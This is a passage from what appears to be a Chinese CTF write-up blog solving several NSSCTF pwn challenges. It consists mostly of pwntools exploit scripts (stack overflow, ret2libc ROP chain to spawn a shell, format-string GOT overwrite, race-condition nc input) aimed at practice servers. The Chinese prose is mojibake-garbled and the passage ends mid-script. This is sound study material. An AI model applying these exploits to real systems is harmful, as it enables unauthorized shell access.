&lt;p&gt;ida æŸ¥çœ‹åˆ°ä»–å¿…é¡»è¦å’Œ buf ç›¸åŒæ‰èƒ½å¾—åˆ° shell é‚£æˆ‘ä»¬å°±å» gdb è°ƒè¯•æŸ¥çœ‹ buff çš„å€¼ x/10a å¯ä»¥æŸ¥çœ‹åˆ° buff çš„å€¼æ®µæŠŠä»–è¾“è¿› buf å³å¯&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#context(log_level=&amp;#x27;debug&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=remote(&amp;#x27;node5.anna.nssctf.cn&amp;#x27;,28286)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=p64(0x144678aadc0e4072)+p64(0x84b6e81a4c7eb0e2)+p64(0xf426588abcee2052)+p64(0xc8cb2c5e90c2)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendline(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;litctf-2023ç‹ ç‹ çš„æº¢å‡ºæ¶…~&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#litctf-2023ç‹ ç‹ çš„æº¢å‡ºæ¶…~&#34;&gt;#&lt;/a&gt; [LitCTF 2023] ç‹ ç‹ çš„æº¢å‡ºæ¶…ï½&lt;/h5&gt;
&lt;p&gt;æ–°çŸ¥è¯† \x00 èƒ½å¤Ÿæˆªæ–­ strlen&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import time&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;s       = lambda data               :io.send(data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sa      = lambda delim,data         :io.sendafter(str(delim), data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sl      = lambda data               :io.sendline(data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sla     = lambda delim,data         :io.sendlineafter(str(delim), data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r       = lambda num                :io.recv(num)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;itr     = lambda                    :io.interactive()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;uu32    = lambda data               :u32(data.ljust(4,b&amp;#x27;\x00&amp;#x27;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;uu64    = lambda data               :u64(data.ljust(8,b&amp;#x27;\x00&amp;#x27;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ls      = lambda data               :log.success(data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;binary = &amp;#x27;./pwn4&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libelf = &amp;#x27;./libc-2.31.so&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;target = &amp;#x27;&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;target = &amp;#x27;&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.arch      = &amp;#x27;amd64&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level = &amp;#x27;debug&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.terminal  = [&amp;#x27;tme?mux&amp;#x27;,&amp;#x27;splitw&amp;#x27;,&amp;#x27;-h&amp;#x27;,&amp;#x27;-l&amp;#x27;,&amp;#x27;130&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io = remote(&amp;#x27;node4.anna.nssctf.cn&amp;#x27;,28710)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#io = process(binary)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pad = 0x68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf = ELF(binary)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rop = ROP(binary)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc = ELF(libelf)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pop_rdi_ret = rop.find_gadget([&amp;#x27;pop rdi&amp;#x27;,&amp;#x27;ret&amp;#x27;])[0]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;puts_got = elf.got[&amp;#x27;puts&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;puts_plt = elf.plt[&amp;#x27;puts&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;vuln = 0x4006B0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ret = 0x0400768&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pay = pad * b&amp;#x27;\x00&amp;#x27; + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sl(pay)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ru(&amp;#x27;Received\n&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;x = uu64(r(6))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc_base = x - libc.sym[&amp;#x27;puts&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;system = libc_base + libc.sym[&amp;#x27;system&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bin_sh = libc_base + next(libc.search(b&amp;#x27;/bin/sh&amp;#x27;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ls(hex(libc_base))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pay = pad * b&amp;#x27;\x00&amp;#x27; + p64(ret)*1 + p64(pop_rdi_ret) + p64(bin_sh) + p64(system) + p64(vuln)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sl(pay)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sl(&amp;#x27;ls&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sl(&amp;#x27;cat flag&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;hnctf-2022-week2ez_backdoor&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#hnctf-2022-week2ez_backdoor&#34;&gt;#&lt;/a&gt; [HNCTF 2022 WEEK2]ez_backdoor&lt;/h5&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import time&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io = remote(&amp;#x27;node5.anna.nssctf.cn&amp;#x27;,28762)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(log_level=&amp;#x27;debug&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#io = process(binary)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bin_sh=0x4011CA&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ret=0x40101a&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=b&amp;#x27;a&amp;#x27;*(0x108)+p64(ret)+p64(bin_sh)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.sendafter(b&amp;#x27;llenge\n&amp;#x27;,payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;nisactf-2022shop_pwn&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#nisactf-2022shop_pwn&#34;&gt;#&lt;/a&gt; [NISACTF 2022]shop_pwn&lt;/h5&gt;
&lt;p&gt;ida æŸ¥çœ‹ game å‡½æ•°é‡Œé¢æœ‰ä¸€ä¸ªå‡½æ•°æ¥åˆ›å»ºå¤šçº¿ç¨‹ï¼Œä½†æ˜¯æœ‰ä¸ª bugï¼Œmoney æ˜¯å…¬å…±èµ„æºï¼Œè¿™ä¸ªçº¿ç¨‹åˆ›å»ºæ—¶å¦å¤–ä¸€ä¸ªçº¿ç¨‹ä¹Ÿåˆ›å»ºäº†ï¼Œå¦‚æœå¤ªå¿«ä¼šé€ æˆéƒ½åœ¨å–é‚£ä¸ª pen ç›´æ¥æ„é€ ä¸€ä¸ª&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;echo -e &amp;quot;3\n0\n3\n0\n2\n1\n1\&amp;quot;|nc node5.anna.nssctf.cn 28765&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;å³å¯æŸ¥çœ‹åˆ° flag&lt;/p&gt;
&lt;h5 id=&#34;hdctf-2023keep-on&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#hdctf-2023keep-on&#34;&gt;#&lt;/a&gt; [HDCTF 2023]KEEP ON&lt;/h5&gt;
&lt;p&gt;è¿™ä¸ªé¢˜æ³¨æ„çš„å­—ç¬¦ä¸²æº¢å‡ºæ˜¯ä¸€ä¸ªç‚¹è¿˜èƒ½å¤Ÿåˆ©ç”¨æ ˆè¿ç§»æ¥è·å– shellï¼Œå­—ç¬¦ä¸²æº¢å‡ºçš„è¯æ˜¯åˆ©ç”¨ printf çš„æº¢å‡ºç‚¹æ˜¯ 6 ç„¶åä½¿ç”¨ fmtstr_payload æ¥è®© system_plt æ¥å’Œ printf_got è¿›è¡Œåˆ‡æ¢åœ¨åˆ©ç”¨åé¢é‚£ä¸ª read å…è®¸æº¢å‡º 8 ä¸ªå­—èŠ‚æ¥è¿”å›åˆ° vuln å»åœ¨å­—ç¬¦ä¸²æº¢å‡ºè¿™é‡Œè¾“å…¥ /bin/sh å³å¯å¾—åˆ° shell&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;figcaption&gt;&lt;span&gt;ON&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(arch=&amp;#x27;amd64&amp;#x27;, os=&amp;#x27;linux&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level = &amp;#x27;debug&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf = ELF(&amp;quot;./hdctf&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#p = process(&amp;#x27;./hdctf&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p = remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28307)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;system_plt = elf.plt[&amp;#x27;system&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;printf_got = elf.got[&amp;#x27;printf&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#gdb.attach(p)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#pause()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload1 = fmtstr_payload(6, &amp;#123;printf_got: system_plt&amp;#125;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;log.info(payload1)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sleep(0.1)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendafter(&amp;#x27;name: \n&amp;#x27;,payload1)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;vuln_addr = 0x40076F&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#pause()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload2 =b&amp;#x27;a&amp;#x27;*(0x50+0x8) + p64(vuln_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sleep(0.1)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendafter(&amp;#x27;on !\n&amp;#x27;,payload2)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#pause()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sleep(0.1)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendafter(&amp;#x27;name: \n&amp;#x27;,&amp;quot;/bin/sh\x00&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;è¿˜èƒ½ä½¿ç”¨æ ˆè¿ç§»å¦‚:&lt;br /&gt;
 ä½¿ç”¨å­—ç¬¦ä¸²æ³„éœ²æ¥å¾—åˆ° rbp æ ˆåº•ä½ç½®ï¼Œä½¿ç”¨ stack æŸ¥çœ‹ rbp æ˜¯å¤šå°‘åœ¨ä½¿ç”¨æº¢å‡ºæ»¡æ»¡è°ƒè¯•å¾—åˆ°ä¸º %16p å³å¯å¾—åˆ° rbpï¼Œåœ¨ s å¤„è¾“å…¥å­—ç¬¦åä½¿ç”¨ pwndbg çš„ search æŸ¥çœ‹ä½ç½®ï¼Œç„¶ååœ¨è®¡ç®—å’Œ s çš„å€¼ç›¸å·®å¤šå°‘ï¼Œä½¿ç”¨ pwndbg çš„ distance å³å¯è®¡ç®—å‡ºç›¸å·®é‡ä¸º 60,rbp å’Œ s ç›¸å·® 0x60 è¿˜æœ‰ 0x8 çš„è¿”å›åœ°å€ï¼Œå³å¯ç®—åˆ°éœ€è¦è¿ç§»çš„æ ˆåœ°å€ä¸ºå¤šå¤š qianyi_rbp-0x60-0x8, åœ¨ä½¿ç”¨å¸¸è§„çš„ rdi pop;ret æ¥å°† /bin/sh å‹å…¥ system å‡½æ•°ä¸­ï¼Œä½†æ˜¯ä¸­é—´éœ€è¦åŠ ä¸€ä¸ª qianyi_rbp-0x20 æ¥ç»´æŒæ ˆå¹³è¡¡&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(log_level=&amp;#x27;debug&amp;#x27;,os=&amp;#x27;linux&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io=remote(&amp;#x27;node4.anna.nssctf.cn&amp;#x27;,28526)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.recvuntil(b&amp;#x27;name: \n&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf=ELF(&amp;#x27;./hdctf&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fmtpayload = 